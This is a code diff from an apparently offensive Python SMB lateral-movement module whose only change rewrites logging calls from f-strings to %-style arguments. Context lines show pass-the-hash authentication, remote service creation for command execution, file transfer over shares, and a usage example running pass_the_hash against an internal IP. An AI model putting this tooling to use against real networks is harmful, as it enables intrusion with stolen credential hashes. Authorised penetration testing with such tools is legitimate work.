@@ -134,7 +134,7 @@ class SMBLateral(BaseLateralModule):
             return False
 
         except (socket.error, socket.timeout, OSError) as e:
-            self.logger.error(f"SMB 连接失败: {e}")
+            self.logger.error("SMB 连接失败: %s", e)
             self._set_status(LateralStatus.FAILED)
             return False
 
@@ -157,7 +157,7 @@ class SMBLateral(BaseLateralModule):
                     self.credentials.lm_hash,
                     self.credentials.nt_hash,
                 )
-                self.logger.info(f"PTH 认证成功: {self.credentials.username}@{self.target}")
+                self.logger.info("PTH 认证成功: %s@%s", self.credentials.username, self.target)
             else:
                 # 密码认证
                 self._conn.login(
@@ -165,14 +165,14 @@ class SMBLateral(BaseLateralModule):
                     self.credentials.password or "",
                     self.credentials.domain or "",
                 )
-                self.logger.info(f"密码认证成功: {self.credentials.username}@{self.target}")
+                self.logger.info("密码认证成功: %s@%s", self.credentials.username, self.target)
 
             self._authenticated = True
             self._use_impacket = True
             return True
 
         except (socket.error, socket.timeout, OSError) as e:
-            self.logger.debug(f"impacket 连接失败: {e}")
+            self.logger.debug("impacket 连接失败: %s", e)
             return False
 
     def _connect_native(self) -> bool:
@@ -217,7 +217,7 @@ class SMBLateral(BaseLateralModule):
             return False
 
         except (socket.error, socket.timeout, OSError) as e:
-            self.logger.debug(f"纯 Python SMB 连接失败: {e}")
+            self.logger.debug("纯 Python SMB 连接失败: %s", e)
             return False
 
     def _build_negotiate_request(self) -> bytes:
@@ -306,7 +306,7 @@ class SMBLateral(BaseLateralModule):
                 else:
                     self._conn.close()
             except (socket.error, OSError) as e:
-                self.logger.debug(f"断开连接时出错: {e}")
+                self.logger.debug("断开连接时出错: %s", e)
             finally:
                 self._conn = None
 
@@ -399,7 +399,7 @@ class SMBLateral(BaseLateralModule):
                 scmr.hRStartServiceW(dce, service_handle)
             except (ValueError, OSError) as start_err:
                 # 服务可能立即停止，这是正常的
-                self.logger.debug(f"服务启动: {start_err}")
+                self.logger.debug("服务启动: %s", start_err)
 
             # 等待执行
             time.sleep(1)
@@ -515,7 +515,7 @@ class SMBLateral(BaseLateralModule):
                 self._conn.putFile(self.config.smb_share, remote_path, f.read)
 
             self._set_status(LateralStatus.CONNECTED)
-            self.logger.info(f"上传成功: {local_path} -> {self.config.smb_share}{remote_path}")
+            self.logger.info("上传成功: %s -> %s%s", local_path, self.config.smb_share, remote_path)
 
             return FileTransferResult(
                 success=True,
@@ -581,7 +581,7 @@ class SMBLateral(BaseLateralModule):
 
             file_size = os.path.getsize(local_path)
             self._set_status(LateralStatus.CONNECTED)
-            self.logger.info(f"下载成功: {self.config.smb_share}{remote_path} -> {local_path}")
+            self.logger.info("下载成功: %s%s -> %s", self.config.smb_share, remote_path, local_path)
 
             return FileTransferResult(
                 success=True,
@@ -630,7 +630,7 @@ class SMBLateral(BaseLateralModule):
                     )
                 )
         except (socket.error, OSError, KeyError) as e:
-            self.logger.error(f"列出共享失败: {e}")
+            self.logger.error("列出共享失败: %s", e)
 
         return shares
 
@@ -659,7 +659,7 @@ class SMBLateral(BaseLateralModule):
                     )
                 )
         except (socket.error, OSError, KeyError) as e:
-            self.logger.error(f"列出文件失败: {e}")
+            self.logger.error("列出文件失败: %s", e)
 
         return files
 
@@ -856,7 +856,7 @@ def smb_download(
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
     logger.info("=== SMB Lateral Movement Module ===")
-    logger.info(f"impacket 可用: {HAS_IMPACKET}")
+    logger.info("impacket 可用: %s", HAS_IMPACKET)
     logger.info("使用示例:")
     logger.info("  from core.lateral import SMBLateral, Credentials, pass_the_hash")
     logger.info("  result = pass_the_hash('192.168.1.100', 'admin', 'aad3b435:8846f7ea...')")
